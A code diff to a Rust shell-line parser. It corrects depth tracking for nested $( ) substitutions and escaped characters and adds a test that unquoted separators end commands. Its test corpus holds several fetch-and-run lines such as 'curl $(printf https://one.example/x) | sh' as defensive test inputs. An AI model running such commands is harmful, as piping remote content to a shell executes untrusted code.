@@ -29,6 +29,9 @@ const SHAPES: &[&str] = &[
     "curl $(printf https://one.example) | sh",
     "curl $(true; printf https://one.example/x) | sh",
     "curl $(echo $(printf https://one.example)) | sh",
+    "curl $( (true); printf https://one.example/x) | sh",
+    "curl $( (a; (b)); printf https://one.example/x) | sh",
+    "curl $(printf 'a)b') | sh",
     "curl \"$(printf 'a;b')\" | sh",
     "curl $(unterminated | sh",
     "echo ')' not a close | sh",
@@ -77,8 +80,9 @@ fn reading(line: &str) -> Vec<Byte> {
             '\\' if !single => {
                 mark(&mut read, at, c, Byte::Delimiter);
                 if let Some((next, escaped)) = chars.next() {
-                    let held = single || double || depth > 0;
-                    mark(&mut read, next, escaped, Byte::Content { held });
+                    // An escaped character is handed over whatever it is:
+                    // that is the whole of what escaping it did.
+                    mark(&mut read, next, escaped, Byte::Content { held: true });
                 }
             }
             '\'' if !double => {
@@ -90,6 +94,15 @@ fn reading(line: &str) -> Vec<Byte> {
                 mark(&mut read, at, c, Byte::Delimiter);
             }
             '$' if !single && chars.peek().is_some_and(|(_, next)| *next == '(') => {
+                depth += 1;
+                mark(&mut read, at, c, Byte::Content { held: true });
+                // The parenthesis belongs to the `$(`, so it is taken here
+                // rather than counted again as a group of its own.
+                if let Some((next, opening)) = chars.next() {
+                    mark(&mut read, next, opening, Byte::Content { held: true });
+                }
+            }
+            '(' if !single && depth > 0 => {
                 depth += 1;
                 mark(&mut read, at, c, Byte::Content { held: true });
             }
@@ -208,6 +221,37 @@ fn no_command_ends_inside_something_the_shell_hands_over() {
             assert!(
                 quoted.is_empty(),
                 "{line:?} was split at {quoted:?}, which it has inside quotes"
+            );
+        }
+    }
+}
+
+/// A separator the shell would act on is not part of any command.
+///
+/// The other half of the boundary, and the half an enumerated case cannot
+/// reach: a reading that never comes back out of a substitution swallows
+/// every separator after it, so the line becomes one command and a test
+/// that only forbids boundaries inside held text passes with nothing to
+/// look at. Depth that is right for one level and wrong for two fails here
+/// and nowhere else.
+#[test]
+fn every_separator_the_shell_would_act_on_ends_a_command() {
+    for line in corpus() {
+        let read = reading(&line);
+        let commands = commands(&line);
+        for (at, _) in line
+            .char_indices()
+            .filter(|(_, c)| matches!(c, '|' | '&' | ';'))
+            .filter(|(at, _)| matches!(read[*at], Byte::Content { held: false }))
+        {
+            let swallowed: Vec<&std::ops::Range<usize>> = commands
+                .iter()
+                .map(|command| &command.at)
+                .filter(|range| range.contains(&at))
+                .collect();
+            assert!(
+                swallowed.is_empty(),
+                "{line:?} keeps the separator at {at} inside {swallowed:?}"
             );
         }
     }
